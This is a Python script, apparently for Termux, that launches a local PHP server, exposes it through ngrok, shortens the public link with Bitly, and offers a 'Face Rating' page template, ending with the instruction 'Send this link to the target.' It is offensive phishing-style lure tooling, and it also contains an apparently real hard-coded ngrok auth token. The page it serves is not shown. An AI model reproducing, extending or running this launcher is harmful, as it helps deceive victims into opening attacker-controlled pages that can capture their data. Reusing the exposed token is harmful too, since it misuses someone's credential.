import os, json, time, subprocess
from urllib.parse import urlencode
import requests

def save_token(token):
    with open("ngrok.json", "w") as f:
        json.dump({"token": token}, f)

def load_token():
    if os.path.exists("ngrok.json"):
        with open("ngrok.json", "r") as f:
            return json.load(f).get("token")
    return None

def bitly_short(url):
    try:
        headers = {'Authorization': 'Bearer YOUR_BITLY_TOKEN'}
        data = {"long_url": url}
        r = requests.post("https://api-ssl.bitly.com/v4/shorten", json=data, headers=headers)
        if r.status_code == 200:
            return r.json()["link"]
    except:
        pass
    return url

def start_ngrok():
    subprocess.Popen(["php", "-S", "127.0.0.1:8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    os.system("killall ngrok > /dev/null 2>&1")
    time.sleep(1)
    subprocess.Popen(["ngrok", "http", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)
    try:
        tunnel = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        url = tunnel["tunnels"][0]["public_url"]
        return url
    except:
        return None

def check_ngrok():
    return subprocess.call(['which', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def install_ngrok():
    print("\nInstalling Ngrok...")
    os.system("pkg install wget -y")
    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
    os.system("unzip ngrok.zip && chmod +x ngrok && mv ngrok /data/data/com.termux/files/usr/bin/")
    os.system("rm -f ngrok.zip")
    print("\nNgrok installed successfully.")

def main():
    print("\n\033[1;33m[!] Do you want to use Ngrok? (y/n)\033[0m")
    print("\033[1;32mNgrok allows access from devices not connected to your Wi-Fi or internet.\033[0m")
    use_ngrok = input("Choice: ").lower()
    if use_ngrok != 'y':
        print("\nRunning only on localhost (http://127.0.0.1:8080)\n")
        subprocess.Popen(["php", "-S", "127.0.0.1:8080"])
        return

    if not check_ngrok():
        print("\n\033[1;31mNgrok is not installed.\033[0m")
        choice = input("Do you want to install Ngrok now? (y/n): ").lower()
        if choice == 'y':
            install_ngrok()
        else:
            print("Ngrok is required for public access. Exiting...")
            return

    print("\n\033[1;31m[!] Turn on your hotspot before continuing!\033[0m\n")
    token = load_token()
    if not token:
        token = input("Enter your Ngrok auth token (or use this: 2uDpowTCpSNGhcKZDFudAIYVgzY_5eQoEwnb1618PjVwqZJgY): ").strip()
        save_token(token)
    os.system(f"ngrok config add-authtoken {token}")

    print("\nAvailable templates:\n[1] Face Rating\n")
    input("Select template [1]: ")

    print("\nStarting PHP server on http://127.0.0.1:8080 ...")
    ngrok_url = start_ngrok()
    if not ngrok_url:
        print("Ngrok failed to start.")
        return

    print(f"\nLocalhost Link : http://127.0.0.1:8080")
    print(f"Ngrok Link     : {ngrok_url}")
    shortened = bitly_short(ngrok_url)
    print(f"Short Bitly URL: {shortened}")
    print("\nSend this link to the target.")
    input("\nPress CTRL+C to exit.\n")

if __name__ == "__main__":
    main()
